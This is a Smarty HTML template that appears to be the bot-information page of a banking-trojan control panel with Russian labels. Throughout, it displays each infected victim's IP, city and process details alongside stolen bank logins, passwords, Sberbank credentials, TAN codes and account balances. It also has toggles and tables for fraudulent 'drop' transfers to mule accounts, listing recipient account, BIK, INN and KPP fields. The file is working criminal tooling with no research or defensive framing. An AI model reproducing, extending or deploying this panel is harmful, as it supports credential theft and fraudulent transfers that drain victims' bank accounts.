<div id="div_sub_{$rand_name}"></div>
<script language="javascript" type="application/javascript">
var id_{$rand_name} = document.getElementById('div_sub_{$rand_name}').parentNode.id.replace('_content', '');
var id_bot_{$rand_name} = '{$bot->id}';
document.getElementById(id_{$rand_name} + '_title').innerHTML = '{$lang.infob} #{$bot->id}';
</script>
{if $nobot eq true}
<hr />
<h2 align="center">{$lang.botnotfound}</h2>
<hr />
{if $bot_uid}
<div style="text-align:center">
{$lang.nbsdpre}
<br />
<a href="/bots/bot-{$bot_uid->id}.html">{$lang.posmtr}</a>
</div>
<hr />
{/if}
{else}
<form name="groups{$rand_name}" id="groups{$rand_name}">
<table cellspacing="1" cellpadding="0" style="width: 100%; border: 1px solid #cccccc;">
<tr class="bgp2">
    <th style="text-align: left; width: 300px;">{$lang.uid}</th>
    <th style="text-align: left;">{$bot->prefix}{$bot->uid} <a href="/bots/bot-{$bot->prefix}{$bot->uid}.html?z={$bot->system}" target="_blank">{$lang.posmtr}</a></th>
</tr>
<tr class="bgp1">
    <th colspan="2">&nbsp;</th>
</tr>
<tr class="bgp2">
    <th style="text-align: left; width: 300px;">Метка</th>
    <th id="l{$rand_name}" style="text-align: left; margin: 5px;"><div class="labels l1" onclick="bls('{$bot->id}', 'l1', 'l{$rand_name}');">{if $bot->label eq 'l1'} OK! {else}&nbsp;{/if}</div>
    <div class="labels l2" onclick="bls('{$bot->id}', 'l2', 'l{$rand_name}');">{if $bot->label eq 'l2'} OK! {else}&nbsp;{/if}</div>
    <div class="labels l3" onclick="bls('{$bot->id}', 'l3', 'l{$rand_name}');">{if $bot->label eq 'l3'} OK! {else}&nbsp;{/if}</div></th>
</tr>
<tr class="bgp1">
    <th colspan="2">&nbsp;</th>
</tr>
<tr class="bgp2">
    <th style="text-align: left;">{$lang.ip}</th>
    <th style="text-align: left;">{$bot->ip}</th>
</tr>
{if $_SESSION.user->config.infoacc != 1}
<tr class="bgp1">
    <th colspan="2">&nbsp;</th>
</tr>
<tr class="bgp2">
    <th style="text-align: left;">UserID</th>
    <th style="text-align: left;">{$bot->userid|userid_name}</th>
</tr>
{/if}
<tr class="bgp1">
    <th colspan="2">&nbsp;</th>
</tr>
<tr class="bgp2">
    <th style="text-align: left;">{$lang.city}</th>
    <th style="text-align: left;">{$bot->city}</th>
</tr>
{if $bot->version ne ''}
<tr class="bgp1">
    <th colspan="2">&nbsp;</th>
</tr>
<tr class="bgp2">
    <th style="text-align: left;">Версия</th>
    <th style="text-align: left;">{$bot->version}</th>
</tr>
{/if}
{if $bot->info.pid ne ''}
<tr class="bgp1">
    <th colspan="2">&nbsp;</th>
</tr>
<tr class="bgp2">
    <th style="text-align: left;">PID</th>
    <th style="text-align: left;">{$bot->info.pid}</th>
</tr>
{/if}
{if $bot->info.status ne ''}
<tr class="bgp1">
    <th colspan="2">&nbsp;</th>
</tr>
<tr class="bgp2">
    <th style="text-align: left;">Status</th>
    <th style="text-align: left;">{$bot->info.status}</th>
</tr>
{/if}
<tr class="bgp1">
    <th colspan="2">&nbsp;</th>
</tr>
<tr class="bgp2">
    <th style="text-align: left;">{$lang.system}</th>
    {if $bot->info.system_percent ne ''}
    <th style="text-align: left;">{$bot->systems->name} (<span id="ep{$rand_name}">Личный: {$bot->info.system_percent}%</span>) <a onclick="edit_percent('{$bot->prefix}{$bot->uid}', 'ep{$rand_name}');"><img src="/images/edit.png" /></a></th>
    {else}
    <th style="text-align: left;">{$bot->systems->name} (<span id="ep{$rand_name}">Стандарт: {$bot->systems->percent}%</span>) <a onclick="edit_percent('{$bot->prefix}{$bot->uid}', 'ep{$rand_name}');"><img src="/images/edit.png" /></a></th>
    {/if}
</tr>
<tr class="bgp1">
    <th colspan="2">&nbsp;</th>
</tr>
<tr class="bgp2">
    <th style="text-align: left; width: 300px;">Получать дропа</th>
    <th style="text-align: left;">{if $bot->info.getdrop eq '1'}{$lang.off}{else}{$lang.on}{/if} <a onclick="setinfo('getdrop', '{$bot->id}', '{$rand_name}', '{$bot->prefix}{$bot->uid}');"><img src="/images/edit.png" /></a></th>
</tr>
<tr class="bgp1">
    <th colspan="2">&nbsp;</th>
</tr>
<tr class="bgp2">
    <th style="text-align: left;">Назначение <a href="#" onclick="edit_note(this.parentNode.parentNode.cells[1], 'groups{$rand_name}');"><img src="/images/edit.png" alt="изменить" /></a>:</th>
    <th style="text-align: left;" id="cn_{$bot->id}" onclick="return false;">{$bot->info.note}</th>
</tr>

</table>

{if $bot->systems->nid eq 'bss'}
<hr />
<h2 align="center">BSS</h2>
<hr />
<table cellspacing="1" cellpadding="0" style="width: 100%; border: 1px solid #cccccc;">
<tr class="bgp1">
    <th style="text-align: left; width: 300px;">{$lang.system}</th>
    <th style="text-align: left;">{$bot->info.vconfig}</th>
</tr>
<tr class="bgp2">
    <th style="text-align: left;">{$lang.dsbld}</th>
    <th style="text-align: left;">{if $bot->info.dsbld eq '1'}{$lang.on}{else}{$lang.off}{/if} <a onclick="setinfo('dsbld', '{$bot->id}', '{$rand_name}');"><img src="/images/edit.png" /></a></th>
</tr>
<tr class="bgp1">
    <th style="text-align: left;">{$lang.slp}</th>
    <th style="text-align: left;">{if $bot->info.slp eq '1'}{$lang.on}{else}{$lang.off}{/if} <a onclick="setinfo('slp', '{$bot->id}', '{$rand_name}');"><img src="/images/edit.png" /></a></th>
</tr>
<tr class="bgp2">
    <th style="text-align: left;">{$lang.infrm}</th>
    <th style="text-align: left;">{if $bot->info.infrm eq '1'}{$lang.on}{else}{$lang.off}{/if} <a onclick="setinfo('infrm', '{$bot->id}', '{$rand_name}');"><img src="/images/edit.png" /></a></th>
</tr>
</table>
{/if}

{if $bot->info.text|count > 0}
<br />
<table cellspacing="1" cellpadding="0" style="width: 100%; border: 1px solid #cccccc;">
{foreach from=$bot->info.text key=key item=item name=tas}
{if $smarty.foreach.tas.iteration is not even}{assign var=bg value=1}{else}{assign var=bg value=2}{/if}
<tr class="bgp{$bg}">
    <th style="text-align: left; width: 300px;">{$key}</th>
    <th style="text-align: left;">{$item}</th>
</tr>
{/foreach}
</table>
<br />
{/if}

{if $bot->info.logs.login ne '' && $bot->info.logs.password ne ''}
<br />
<table cellspacing="1" cellpadding="0" style="width: 100%; border: 1px solid #cccccc;">
<tr class="bgp1">
    <th style="text-align: left; width: 300px;">Логин</th>
    <th style="text-align: left;">{$bot->info.logs.login}</th>
</tr>
<tr class="bgp2">
    <th style="text-align: left; width: 300px;">Пасс</th>
    <th style="text-align: left;">{$bot->info.logs.password}</th>
</tr>

</table>
<br />
{/if}

{if $bot->info.login ne '' && $bot->info.pass1 ne ''}
<br />
<table cellspacing="1" cellpadding="0" style="width: 100%; border: 1px solid #cccccc;">
<tr class="bgp1">
    <th style="text-align: left; width: 300px;">Логин</th>
    <th style="text-align: left;">{$bot->info.login}</th>
</tr>
<tr class="bgp2">
    <th style="text-align: left; width: 300px;">Пасс #1</th>
    <th style="text-align: left;">{$bot->info.pass1}</th>
</tr>
{if $bot->info.pass2 ne ''}
<tr class="bgp1">
    <th style="text-align: left; width: 300px;">Пасс #2</th>
    <th style="text-align: left;">{$bot->info.pass2}</th>
</tr>
{/if}
</table>
<br />
{/if}

{if $bot->info.logs.accAndSumm}
<br />
<table cellspacing="1" cellpadding="0" style="width: 100%; border: 1px solid #cccccc;">
<tr class="bgp1">
    <th colspan="2" style="text-align: left; width: 300px;text-align:center">Счета</th>
</tr>
{foreach from=$bot->info.logs.accAndSumm item=item name=as}
{if $smarty.foreach.as.iteration is not even}{assign var=bg value=1}{else}{assign var=bg value=2}{/if}
<tr class="bgp{$bg}">
    <th style="text-align: left; width: 300px;">{$item.acc}</th>
    <th style="text-align: left;">{$item.summ}</th>
</tr>
{/foreach}
</table>
<br />
{/if}

{if $bot->info.sbank}
<br />
<table cellspacing="1" cellpadding="0" style="width: 100%; border: 1px solid #cccccc;">
<tr class="bgp1">
    <th colspan="2" style="text-align: left; width: 300px;text-align:center">Сбанк пасс</th>
</tr>
<tr class="bgp2">
    <th style="text-align: left; width: 300px;">{$bot->info.sbank.acc}</th>
    <th style="text-align: left;">{$bot->info.sbank.pass}</th>
</tr>
</table>
<br />
{/if}

{if $bot->info.logs.tan}
<br />
<table cellspacing="1" cellpadding="0" style="width: 100%; border: 1px solid #cccccc;">
<tr class="bgp1">
    <th colspan="3" style="text-align: left; text-align:center">Tans</th>
</tr>
{foreach from=$bot->info.logs.tan item=item name=at}
{if $smarty.foreach.at.iteration is not even}{assign var=bg value=1}{else}{assign var=bg value=2}{/if}
<tr class="bgp{$bg}">
    <th style="text-align: left;">{$item.0}</th>
    <th style="text-align: left;  width: 30%;">{$item.1}</th>
    <th style="text-align: left;  width: 30%;">{$item.2|date_format:"%d/%m/%Y %H:%M"}</th>
</tr>
{/foreach}
</table>
<br />
{/if}

{if $bot->drops_data|@count >= 1}
<hr />
<h2 align="center">{$lang.ldq}</h2>
<hr />
<table cellspacing="1" cellpadding="3" style="width: 100%; border: 1px solid #cccccc;" align="center">
<tr class="bgp3">
    <th style="min-width:300px;">{$lang.infodrop}</th>
    <th width="5%">{$lang.sume}</th>
    <th width="8%">{$lang.status}</th>
    <th width="8%">{$lang.ip}</th>
    <th width="8%">{$lang.data}</th>
</tr>
{foreach from=$bot->drops_data item=item name=drops_data}
{if $smarty.foreach.drops_data.iteration is not even}{assign var=bg value=1}{else}{assign var=bg value=2}{/if}
<tr class="bgp{$bg}">
    <th style="font-size:9px; text-align:left; padding-left: 20px">
    {getdi($item->info)}
    {if $item->info->trans->docnum ne ''}Номер: {$item->info->trans->docnum}<br />{/if}
    {if $item->info->drop->name ne ''}{$lang.name}: {$item->info->drop->name}<br />{/if}
    {if $item->info->drop->receiver ne ''}{$lang.receiver}: {$item->info->drop->receiver}<br />{/if}
    {if $item->info->drop->destination ne ''}{$lang.destination}: {$item->info->drop->destination}<br />{/if}
    {if $item->info->drop->acc ne ''}{$lang.acc}: {$item->info->drop->acc}<br />{/if}
    {if $item->info->drop->from ne ''}{$lang.from}: {$item->info->drop->from}<br />{/if}
    {if $item->info->drop->to ne ''}{$lang.to}: {$item->info->drop->to}<br />{/if}
    {if $item->info->drop->vat ne ''}{$lang.vat}: {$item->info->drop->vat}%<br />{/if}
    {if $item->info->drop->other.kppb ne ''}{$lang.dkppb}: {$item->info->drop->other.kppb}<br />{/if}
    {if $item->info->drop->other.bik ne ''}{$lang.dbik}: {$item->info->drop->other.bik}<br />{/if}
    {if $item->info->drop->other.BnkKOrrAcnt ne ''}{$lang.dsbp}: {$item->info->drop->other.BnkKOrrAcnt}<br />{/if}
    {if $item->info->drop->other.inn ne ''}{$lang.inn}: {$item->info->drop->other.inn}<br />{/if}
    {if $item->info->drop->other.kppp ne ''}{$lang.dkppp}: {$item->info->drop->other.kppp}<br />{/if}
    {if $item->info->system->vat ne 0}{$lang.vate}: {$item->info->system->vat}<br />{/if}
    </th>
    <th>{if $item->info->system->sum ne ''}{$item->info->system->sum}{else}-{/if}</th>
    
    {if $item->system eq 'bss'}
    <th>{if $lang.bss_status[$item->status]}{$lang.bss_status[$item->status]}{else}{$item->status}{/if}<br /><br />{if $item->passiv eq 1}Пасив{else}Актив{/if}</th>
    {else}
    <th>{if $item->status eq 1}Получил{elseif $item->status eq 2}Выполнен{else}{$item->status}{/if}<br /><br />{if $item->passiv eq 1}Пасив{else}Актив{/if}</th>
    {/if}
    
    <th>{$item->ip}</th>
    <th>{$item->post_date}</th>
</tr>
{/foreach}
</table>
{/if}

{if $bot->balance|@count >= 1}
<hr />
<h2 align="center">{$lang.lbq}</h2>
<hr />
<table cellspacing="1" cellpadding="0" style="width: 100%; border: 1px solid #cccccc;" align="center">
<tr class="bgp3">
    <th width="20%">{$lang.ip}</th>
    <th width="35%">{$lang.acc}</th>
    <th width="20%">{$lang.balance}</th>
    <th width="25%">{$lang.data}</th>
</tr>
{foreach from=$bot->balance item=item name=balance}
{if $smarty.foreach.balance.iteration is not even}{assign var=bg value=1}{else}{assign var=bg value=2}{/if}
<tr class="bgp{$bg}">
    <th>{$item->ip}</th>
    <th>{$item->acc}</th>
    <th>{$item->balance}</th>
    <th>{$item->post_date}</th>
</tr>
{/foreach}
</table>
{/if}

{if $bot->logs_history|@count >= 1}
<hr />
<h2 align="center">{$lang.logtsh}</h2>
<hr />
<div id="logs_history{$rand_name}">
<div id="lph_{$bot->id}_{$rand_name}" align="center">{$logs_history_pages}</div><br />
<div id="lhp_{$bot->id}_{$rand_name}"align="center"><a href="#null" onclick="gltlh(this);">{$lang.logs_clear_history}</a></div>
<br />
<table cellspacing="1" cellpadding="0" style="width: 100%; border: 1px solid #cccccc;" align="center">
<tr class="bgp3">
    <th width="30%">{$lang.receiver}</th>
    <th width="20%">{$lang.sum}</th>
    <th width="20%">{$lang.date}</th>
    <th width="30%">{$lang.note}</th>
 </tr>
{foreach from=$bot->logs_history item=item name=logs}
{if $smarty.foreach.logs_history.iteration is not even}{assign var=bg value=1}{else}{assign var=bg value=2}{/if}
<tr class="bgp{$bg}">
    <th>{$item->receiver}</th>
    <th>{$item->sum}</th>
    <th>{$item->date}</th>
    <th>{$item->note}</th>
</tr>
{/foreach}
</table>
</div>
{/if}

{if $bot->logs|@count >= 1}
<hr />
<h2 align="center">{$lang.logss}</h2>
<hr />
<div id="logs{$rand_name}">
<div id="lp_{$bot->id}_{$rand_name}" align="center">{$logs_pages}</div>
<br />
<table cellspacing="1" cellpadding="0" style="width: 100%; border: 1px solid #cccccc;" align="center">
<tr class="bgp3">
    <th width="15%">{$lang.ip}</th>
    <th width="50%">{$lang.log}</th>
    <th width="10%">{$lang.version}</th>
    <th width="25%">{$lang.data}</th>
 </tr>
{foreach from=$bot->logs item=item name=logs}
{if $smarty.foreach.logs.iteration is not even}{assign var=bg value=1}{else}{assign var=bg value=2}{/if}
<tr class="bgp{$bg}">
    <th>{$item->ip}</th>
    <th>{$item->log}</th>
    <th>{$item->version}</th>
    <th>{$item->post_date}</th>
</tr>
{/foreach}
</table>
</div>
{/if}

{if $bot->logs_tech|@count >= 1}
<hr />
<h2 align="center">{$lang.logtss}</h2>
<hr />
<div id="logs_tech{$rand_name}">
<div id="lpt_{$bot->id}_{$rand_name}" align="center">{$logs_tech_pages}</div><br />
<div id="ltp_{$bot->id}_{$rand_name}"align="center"><a href="#null" onclick="gltl(this);">{$lang.logs_clear_tech}</a></div>
<br />
<table cellspacing="1" cellpadding="0" style="width: 100%; border: 1px solid #cccccc;" align="center">
<tr class="bgp3">
    <th width="50%">{$lang.log}</th>
    <th width="25%">{$lang.data}</th>
 </tr>
{foreach from=$bot->logs_tech item=item name=logs}
{if $smarty.foreach.logs_tech.iteration is not even}{assign var=bg value=1}{else}{assign var=bg value=2}{/if}
<tr class="bgp{$bg}">
    <th><div style="overflow:scroll; max-width: 600px">{$item->log}<div></th>
    <th>{$item->post_date}</th>
</tr>
{/foreach}
</table>
</div>
{/if}

</form>
{/if}
<br />